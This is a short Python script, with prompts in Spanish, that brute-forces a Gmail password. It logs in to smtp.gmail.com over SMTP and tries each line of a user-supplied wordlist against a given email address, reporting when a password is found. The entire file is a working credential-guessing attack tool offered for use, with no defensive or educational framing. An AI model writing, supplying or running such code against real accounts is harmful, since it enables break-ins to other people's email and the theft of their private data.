import smtplib
import time

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("--> Introduce la direccion email: ")
passwfile = input("--> Introduce el archivo de contraseñas: ")
passwfile = open(passwfile, "r")

for password in passwfile:

	try:

		time.sleep(1)
		smtpserver.login(user, password)
		print ("- Contraseña encontrada: %s" % password)
		break;

	except smtplib.SMTPAuthenticationError:
		time.sleep(1)
		print ("- Contraseña incorrecta: %s" % password)
